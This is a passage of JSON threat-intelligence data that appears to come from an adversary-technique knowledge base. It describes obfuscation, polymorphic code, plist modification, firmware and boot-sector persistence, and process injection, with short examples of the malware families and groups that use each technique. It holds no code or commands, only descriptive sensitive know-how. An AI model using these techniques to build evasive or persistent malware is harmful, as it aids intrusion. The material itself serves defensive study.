orxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_= character sets."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis has been encrypted using XOR and RC4."}, {"id": "S0168", "name": "Gazer", "description": "Gazer logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium has the ability to compress its components."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy's uninstaller has base64-encoded its variables. "}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has written AES-encrypted and Base64-encoded configuration files to disk."}, {"id": "S0531", "name": "Grandoreiro", "description": "The Grandoreiro payload has been delivered encrypted with a custom XOR-based algorithm and also as a base64-encoded ZIP file."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT supports file encryption (AES with the key \"lolomycin2017\")."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy encrypts its configuration files with AES-256 and also encrypts its strings."}, {"id": "G0043", "name": "Group5", "description": "Group5 disguised its malicious binaries with several layers of obfuscation, including encrypting the files."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL has encrypted the payload with an XOR-based algorithm."}, {"id": "S0170", "name": "Helminth", "description": "The Helminth config file is encrypted with RC4."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can compress 32-bit and 64-bit driver files with the Lempel-Ziv algorithm."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard has the ability to encrypt PE files with a reverse XOR loop."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can encrypt its payload."}, {"id": "S0087", "name": "Hi-Zor", "description": "Hi-Zor uses various XOR techniques to obfuscate its components."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp encrypts its configuration and payload."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used Base64 encoded compressed payloads."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has encrypted an ELF file."}, {"id": "S0232", "name": "HOMEFRY", "description": "Some strings in HOMEFRY are obfuscated with XOR x56."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has encrypted strings with single-byte XOR and base64 encoded RC4."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro can be delivered encrypted to a compromised host."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has utilzed encrypted binaries and base64 encoded strings."}, {"id": "G0100", "name": "Inception", "description": "Inception has encrypted malware payloads dropped on victim machines with AES and RC4 encryption."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper contains an embedded XML configuration file with an encrypted list of command and control servers. These are written to an external configuration file during execution."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector can obfuscate variable names, encrypt strings, as well as base64 encode and Rijndael encrypt payloads."}, {"id": "S0044", "name": "JHUHUGIT", "description": "Many strings in JHUHUGIT are obfuscated with a XOR algorithm."}, {"id": "S0487", "name": "Kessel", "description": "Kessel's configuration is hardcoded and RC4 encrypted within the binary."}, {"id": "S1020", "name": "Kevin", "description": "Kevin has Base64-encoded its configuration file."}, {"id": "S0387", "name": "KeyBoy", "description": "In one version of KeyBoy, string obfuscation routines were used to hide many of the critical values referenced in the malware."}, {"id": "S1051", "name": "KEYPLUG", "description": "KEYPLUG can use a hardcoded one-byte XOR encoded configuration file."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY has used encrypted strings in its installer."}, {"id": "S0356", "name": "KONNI", "description": "KONNI is heavily obfuscated and includes encrypted configuration files."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs downloads additional files that are base64-encoded and encrypted with another cipher."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has used a pseudo random number generator (PRNG) algorithm and a rolling XOR key to obfuscate strings."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for Native API function names."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has obfuscated code using base64 and gzip compression."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron encrypts its configuration files with AES-256."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner has encrypted DMG files."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail has used RC4 and AES to encrypt strings and its exfiltration configuration respectively."}, {"id": "S1141", "name": "LunarWeb", "description": "The LunarWeb install files have been encrypted with AES-256."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda has been obfuscated and contains encrypted functions."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware has used base64-encoded files and has also encrypted embedded strings with AES."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro has used scripts encoded in Base64 certificates to distribute malware to victims."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40."}, {"id": "G1013", "name": "Metador", "description": "Metador has encrypted their payloads."}, {"id": "S1059", "name": "metaMain", "description": "metaMain's module file has been encrypted via XOR."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has encrypted payloads and strings."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia obfuscates the configuration with a custom Base64 and XOR."}, {"id": "S1015", "name": "Milan", "description": "Milan can encode files containing information about the targeted system."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu uses a custom algorithm to obfuscate its internal strings and uses hardcoded keys.Mispadu also uses encoded configuration files and has encoded payloads using Base64."}, {"id": "G0103", "name": "Mofang", "description": "Mofang has compressed the ShimRat executable within malicious email attachments. Mofang has also encrypted payloads before they are downloaded to victims."}, {"id": "G0021", "name": "Molerats", "description": "Molerats has delivered compressed executables within ZIP files to victims."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has used encrypted payloads within files for follow-on execution and defense evasion."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs's payload has been encrypted with a key that has the hostname and processor family information appended to the end."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has used obfuscated web shells in their operations."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito\u2019s installer is obfuscated with a custom crypter to obfuscate the installer."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu encodes files in Base64."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used a DLL that included an XOR-encoded section."}, {"id": "S1100", "name": "Ninja", "description": "The Ninja payload is XOR encrypted and compressed. Ninja has also XORed its configuration data with a constant value of 0xAA and compressed it with the LZSS algorithm."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has included a base64 encoded executable."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has encrypted and encoded data in its malware, including by using base64."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group encrypted malware such as  DRATzarus with XOR and DLL files with base64."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors encoded some payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key; other payloads were Base64-encoded."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors used Base64 to encode files with a custom key."}, {"id": "C0005", "name": "Operation Spalax", "description": "For Operation Spalax, the threat actors used XOR-encrypted payloads."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D encrypts its strings in RSA256 and encodes them in a custom base64 scheme and XOR."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has been encrypted with XOR using different 32-long Base16 strings and compressed with LZW algorithm."}, {"id": "S0587", "name": "Penquin", "description": "Penquin has encrypted strings in the binary for obfuscation."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon modules are stored encrypted on disk."}, {"id": "S0113", "name": "Prikormka", "description": "Some resources in Prikormka are encrypted with a simple XOR operation or encoded with Base64."}, {"id": "S0613", "name": "PS1", "description": "PS1 is distributed as a set of encrypted files and scripts."}, {"id": "G0024", "name": "Putter Panda", "description": "Droppers used by Putter Panda use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 \u2013 0xAF to obfuscate payloads."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt has been compiled and encrypted with PyInstaller, specifically using the --key flag during the build phase."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer uses RC4 encryption for strings and command and control addresses to evade static detection."}, {"id": "S0565", "name": "Raindrop", "description": "Raindrop encrypted its payload using a simple XOR algorithm with a single-byte key."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay has downloaded as a XOR-encrypted payload."}, {"id": "S1113", "name": "RAPIDPULSE", "description": "RAPIDPULSE has the ability to RC4 encrypt and base64 encode decrypted files on compromised servers prior to writing them to stdout."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can compress and obfuscate its strings to evade detection on a compromised host."}, {"id": "S0172", "name": "Reaver", "description": "Reaver encrypts some of its files with XOR."}, {"id": "S0153", "name": "RedLeaves", "description": "A RedLeaves configuration file is encrypted with a simple XOR key, 0x53."}, {"id": "S0375", "name": "Remexi", "description": "Remexi obfuscates its configuration data with XOR."}, {"id": "S0125", "name": "Remsec", "description": "Some data in Remsec is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded."}, {"id": "S0496", "name": "REvil", "description": "REvil has used encrypted strings and configuration files."}, {"id": "S0433", "name": "Rifdoor", "description": "Rifdoor has encrypted strings with a single byte XOR algorithm."}, {"id": "S0448", "name": "Rising Sun", "description": "Configuration data used by Rising Sun has been encrypted using an RC4 stream algorithm."}, {"id": "S1150", "name": "ROADSWEEP", "description": "The ROADSWEEP binary contains RC4 encrypted embedded scripts."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear initial payloads included encoded follow-on payloads located in the resources file of the first-stage loader."}, {"id": "S0074", "name": "Sakula", "description": "Sakula uses single-byte XOR obfuscation to obfuscate many of its files."}, {"id": "S0370", "name": "SamSam", "description": "SamSam has been seen using AES or DES to encrypt payloads and payload components."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt obfuscates configuration data."}, {"id": "S1019", "name": "Shark", "description": "Shark can use encrypted and encoded files for C2 configuration."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used base64 encoding and ECDH-P256 encryption for payloads."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has encrypted it's main payload using 3DES."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can encrypt strings at compile time."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader uses a simple one-byte XOR method to obfuscate values in the malware."}, {"id": "S1124", "name": "SocGholish", "description": "The SocGholish JavaScript payload has been delivered within a compressed ZIP archive. SocGholish has also single or double Base-64 encoded references to its second-stage server URLs."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp encodes its second-stage payload with Base64. "}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has been obfuscated with a XOR-based algorithm."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE has been obfuscated with hex-encoded strings."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has obfuscated its module with an alphabet-based table or XOR encryption."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has used encrypted strings in its dropper component."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet uses encrypted configuration blocks and writes encrypted files to disk."}, {"id": "S0578", "name": "SUPERNOVA", "description": "SUPERNOVA contained Base64-encoded strings."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can encrypt and encode its configuration file."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used compressed and char-encoded scripts in operations."}, {"id": "G0092", "name": "TA505", "description": "TA505 has password-protected malicious Word documents."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can use encrypted string blocks for obfuscation."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has encrypted its binaries via AES and encoded files using Base64."}, {"id": "G0027", "name": "Threat Group-3390", "description": "A Threat Group-3390 tool can encrypt payloads using XOR. Threat Group-3390 malware is also obfuscated using Metasploit\u2019s shikata_ga_nai encoder as well as compressed with LZNT1 compression."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle has been compressed and obfuscated using RC4, AES, or XOR."}, {"id": "S0131", "name": "TINYTYPHON", "description": "TINYTYPHON has used XOR with 0x90 to obfuscate its configuration file."}, {"id": "S0678", "name": "Torisma", "description": "Torisma has been Base64 encoded and AES encrypted."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has dropped encoded executables on compromised hosts."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has encrypted configuration files."}, {"id": "S0263", "name": "TYPEFRAME", "description": "APIs and strings in some TYPEFRAME variants are RC4 encrypted. Another variant is encoded with XOR."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use AES and CAST-128 encryption to obfuscate resources."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used an XOR-based algorithm to encrypt Tor clients dropped to disk. Ursnif droppers have also been delivered as password-protected zip files that execute base64 encoded PowerShell commands."}, {"id": "S0136", "name": "USBStealer", "description": "Most strings in USBStealer are encrypted using 3DES and XOR and reversed."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN is obfuscated using the obfuscation tool called ConfuserEx."}, {"id": "S1154", "name": "VersaMem", "description": "VersaMem encrypted captured credentials with AES then Base64 encoded them before writing to local storage."}, {"id": "S0180", "name": "Volgmer", "description": "A Volgmer variant is encoded using a simple XOR cipher."}, {"id": "S0612", "name": "WastedLocker", "description": "The WastedLocker payload includes encrypted strings stored within the .bss section of the binary file."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear has used RC4 encrypted shellcode and encrypted functions."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can Base64 encode strings, store downloaded files in reverse byte order,  and use the Eazfuscator tool to obfuscate its third stage."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has encrypted the payload used for C2."}, {"id": "S0466", "name": "WindTail", "description": "WindTail can be delivered as a compressed, encrypted, and encoded payload."}, {"id": "S0430", "name": "Winnti for Linux", "description": "Winnti for Linux can encode its configuration file with single-byte XOR encoding."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows has the ability to encrypt and compress its payload."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT has used Base64 encoded strings and scripts."}, {"id": "S0388", "name": "YAHOYAH", "description": "YAHOYAH encrypts its configuration file using a simple algorithm."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT has encrypted its payload with RC4."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda encrypts strings with XOR. Zeus Panda also encrypts all configuration and settings in AES and RC4."}, {"id": "S0672", "name": "Zox", "description": "Zox has been encoded with Base64."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has been encoded to avoid detection from static analysis tools."}]}, {"name": "Polymorphic Code", "description": "Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution. With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools. Other obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as Software Packing, Command Obfuscation, or Encrypted/Encoded File.", "detailed_description": "Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution. With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools. Other obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as Software Packing, Command Obfuscation, or Encrypted/Encoded File.", "id": "T1027.014", "examples": [{"id": "S0574", "name": "BendyBear", "description": "BendyBear changes its runtime footprint during code execution to evade signature-based defenses."}]}]}, {"name": "Plist File Modification", "description": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the info.plist file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.", "detailed_description": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the info.plist file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. Hidden Window) or running additional commands for persistence (ex: Launch Agent/Launch Daemon or Re-opened Applications).\nFor example, adversaries can add a malicious application path to the ~/Library/Preferences/com.apple.dock.plist file, which controls apps that appear in the Dock. Adversaries can also modify the LSUIElement key in an application\u2019s info.plist file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as LSEnvironment, to enable persistence via Dynamic Linker Hijacking.", "id": "T1647", "examples": [{"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can create and populate property list (plist) files to enable execution."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses the plutil command to modify the LSUIElement, DFBundleDisplayName, and CFBundleIdentifier keys in the /Contents/Info.plist file to change how XCSSET is visible on the system."}], "sub_techniques": []}, {"name": "Pre-OS Boot", "description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.", "detailed_description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.", "id": "T1542", "examples": [], "sub_techniques": [{"name": "System Firmware", "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.", "detailed_description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.", "id": "T1542.001", "examples": [{"id": "S0047", "name": "Hacking Team UEFI Rootkit", "description": "Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems."}, {"id": "S0397", "name": "LoJax", "description": "LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems."}, {"id": "S0001", "name": "Trojan.Mebromi", "description": "Trojan.Mebromi performs BIOS modification and can download and execute a file as well as protect itself from removal."}]}, {"name": "Component Firmware", "description": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.", "detailed_description": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.", "id": "T1542.002", "examples": [{"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink has maintained persistence by patching legitimate device firmware when it is downloaded, including that of WatchGuard devices."}, {"id": "G0020", "name": "Equation", "description": "Equation is known to have the capability to overwrite the firmware on hard drives from some manufacturers."}]}, {"name": "Bootkit", "description": "Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.", "detailed_description": "Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.", "id": "T1542.003", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy."}, {"id": "G0096", "name": "APT41", "description": "APT41 deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems."}, {"id": "S0114", "name": "BOOTRASH", "description": "BOOTRASH is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has installed a bootkit on the system to maintain persistence."}, {"id": "S0182", "name": "FinFisher", "description": "Some FinFisher variants incorporate an MBR rootkit."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down."}, {"id": "S0112", "name": "ROCKBOOT", "description": "ROCKBOOT is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can implant malicious code into a compromised device's firmware."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate overwrites the MBR with a bootloader component that performs destructive wiping operations on hard drives and displays a fake ransom note when the host boots."}]}, {"name": "ROMMONkit", "description": "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. ", "detailed_description": "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. \nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.", "id": "T1542.004", "examples": []}, {"name": "TFTP Boot", "description": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.", "detailed_description": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with Modify System Image to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to ROMMONkit and may result in the network device running a modified image.", "id": "T1542.005", "examples": []}]}, {"name": "Process Injection", "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.", "detailed_description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "id": "T1055", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team loaded BlackEnergy into svchost.exe, which then launched iexplore.exe for their C2. "}, {"id": "S0469", "name": "ABK", "description": "ABK has the ability to inject shellcode into svchost.exe."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can inject into known, vulnerable binaries on targeted hosts."}, {"id": "S1074", "name": "ANDROMEDA", "description": "ANDROMEDA can inject into the wuauclt.exe process to perform C2 actions."}, {"id": "G0050", "name": "APT32", "description": "APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe."}, {"id": "G0067", "name": "APT37", "description": "APT37 injects its malware variant, ROKRAT, into the cmd.exe process."}, {"id": "G0096", "name": "APT41", "description": "APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used the CLEANPULSE utility to insert command line strings into a targeted process to alter its functionality."}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher can inject itself into running processes to gain higher privileges and to evade detection."}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred can inject code from files to other running processes."}, {"id": "S0473", "name": "Avenger", "description": "Avenger has the ability to inject shellcode into svchost.exe."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea injects itself into explorer.exe."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can inject itself into an existing explorer.exe process by using RtlCreateUserThread."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can inject code through calling VirtualAllocExNuma."}, {"id": "S0470", "name": "BBK", "description": "BBK has the ability to inject shellcode into svchost.exe."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can inject code into multiple processes on infected endpoints."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT injects into a newly spawned process created from a native Windows executable."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can inject into the svchost.exe process for execution."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER includes a binary labeled authd that can inject a library into a running process and then hook an existing function within that process with a new function from that library."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has injected code into trusted processes."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can inject a variety of payloads into processes dynamically chosen by the adversary."}, {"id": "S0614", "name": "CostaBricks", "description": "CostaBricks can inject a payload into the memory of a compromised host."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used malicious SparkGateway plugins to inject shared objects into web process memory on compromised Ivanti Secure Connect VPNs to enable deployment of backdoors."}, {"id": "S0695", "name": "Donut", "description": "Donut includes a subproject DonutTest to inject shellcode into a target process."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP compromises the .text section of a legitimate system DLL in %windir% to hold the contents of retrieved plug-ins."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to directly inject its code into the web browser process."}, {"id": "S0554", "name": "Egregor", "description": "Egregor can inject its payload into iexplore.exe process."}, {"id": "S0363", "name": "Empire", "description": "Empire contains multiple modules for injecting into processes, such as Invoke-PSInject."}, {"id": "S0168", "name": "Gazer", "description": "Gazer injects its communication module into an Internet accessible process through which it performs C2."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT can inject malicious code into process created by the \"Command_Create&Inject\" function."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state. GuLoader has previously used RegAsm as a donor process."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has injected into running processes."}, {"id": "S0040", "name": "HTRAN", "description": "HTRAN can inject into into running processes."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro can run shellcode it injects into a newly created process."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT performs code injection injecting its own functions to browser processes."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can inject content into lsass.exe to load a module."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used Win7Elevate to inject malicious code into explorer.exe."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can migrate the loader into another process."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can inject the loader file, Speech02.db, into a process."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type has been injected directly into a running process, including explorer.exe."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu's binary is injected into memory via WriteProcessMemory."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT copies itself into a running Internet Explorer process to evade detection."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe."}, {"id": "S1100", "name": "Ninja", 